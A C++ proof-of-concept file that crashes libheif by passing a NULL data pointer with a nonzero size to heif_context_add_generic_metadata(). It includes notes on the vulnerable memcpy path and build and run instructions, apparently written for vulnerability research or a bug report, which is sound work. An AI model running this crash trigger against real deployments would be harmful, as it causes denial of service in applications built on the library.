/*
 * Bug 09 POC 2: NULL data pointer passed to heif_context_add_generic_metadata()
 *
 * Vulnerable code: libheif/context.cc:1795-1796
 *   HeifContext::add_generic_metadata(..., const void* data, int size, ...)
 *   {
 *     ...
 *     data_array.resize(size);
 *     memcpy(data_array.data(), data, size);  // <-- data is NULL, size > 0 -> SIGSEGV
 *   }
 *
 * The same vulnerable memcpy path is reached from:
 *   heif_context_add_generic_metadata()   [direct]
 *   heif_context_add_XMP_metadata()       [via add_XMP_metadata -> add_generic_metadata]
 *   heif_context_add_exif_metadata()      [via add_exif_metadata -> add_generic_metadata]
 *
 * Trigger: heif_context_add_generic_metadata(ctx, hdl, NULL, 64, "test", "text/plain")
 * Result:  SIGSEGV / AddressSanitizer: SEGV on address 0x0 (memcpy with null src)
 *
 * Build:
 *   clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
 *     -I<libheif_api> -I<cmake_build_dir> \
 *     poc_add_metadata_null.cc libheif.a \
 *     /usr/lib/x86_64-linux-gnu/libz.so.1 -lm -lpthread -ldl \
 *     -o poc_add_metadata_null
 *
 * Run:
 *   ./poc_add_metadata_null
 */

#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <libheif/heif.h>
#include <libheif/heif_context.h>
#include <libheif/heif_encoding.h>
#include <libheif/heif_image.h>
#include <libheif/heif_image_handle.h>
#include <libheif/heif_metadata.h>

/*
 * Create a minimal encoded image using the built-in mask encoder (no codec plugin needed).
 * Returns an image handle that can be used with add_generic_metadata.
 */
static heif_image_handle* make_mask_image_handle(heif_context* ctx) {
    heif_image* img = nullptr;
    heif_error err;

    err = heif_image_create(4, 4, heif_colorspace_monochrome, heif_chroma_monochrome, &img);
    if (err.code) { fprintf(stderr, "[-] heif_image_create: %s\n", err.message); return nullptr; }

    err = heif_image_add_plane(img, heif_channel_Y, 4, 4, 8);
    if (err.code) { fprintf(stderr, "[-] heif_image_add_plane: %s\n", err.message); heif_image_release(img); return nullptr; }

    int stride = 0;
    uint8_t* plane = heif_image_get_plane(img, heif_channel_Y, &stride);
    memset(plane, 0, stride * 4);

    heif_encoder* enc = nullptr;
    err = heif_context_get_encoder_for_format(ctx, heif_compression_mask, &enc);
    if (err.code || !enc) {
        fprintf(stderr, "[-] heif_context_get_encoder_for_format(mask): %s\n",
                err.message ? err.message : "no encoder");
        heif_image_release(img);
        return nullptr;
    }

    heif_image_handle* hdl = nullptr;
    err = heif_context_encode_image(ctx, img, enc, nullptr, &hdl);
    heif_encoder_release(enc);
    heif_image_release(img);
    if (err.code) { fprintf(stderr, "[-] encode: %s\n", err.message); return nullptr; }
    return hdl;
}

int main() {
    fprintf(stderr, "[+] Bug 09 POC 2: NULL data to heif_context_add_generic_metadata()\n");
    fprintf(stderr, "[+] Vulnerable location: libheif/context.cc:1796\n");

    heif_context* ctx = heif_context_alloc();
    if (!ctx) { fprintf(stderr, "[-] heif_context_alloc() failed\n"); return 1; }

    heif_image_handle* hdl = make_mask_image_handle(ctx);
    if (!hdl) {
        fprintf(stderr, "[-] Could not obtain image handle\n");
        heif_context_free(ctx);
        return 1;
    }
    fprintf(stderr, "[+] Got image handle\n");

    fprintf(stderr, "[+] Calling heif_context_add_generic_metadata(ctx, hdl, NULL, 64, \"test\", \"text/plain\")\n");
    /*
     * data=NULL, size=64:
     *   heif_context_add_generic_metadata()
     *   -> HeifContext::add_generic_metadata(..., NULL, 64, ...)
     *   -> data_array.resize(64);
     *   -> memcpy(data_array.data(), NULL, 64) -> SIGSEGV
     */
    heif_error err = heif_context_add_generic_metadata(ctx, hdl, NULL, 64, "test", "text/plain");

    /* Should not reach here */
    fprintf(stderr, "[-] UNEXPECTED: returned without crash, code=%d message=%s\n",
            err.code, err.message ? err.message : "(null)");

    heif_image_handle_release(hdl);
    heif_context_free(ctx);
    return 0;
}
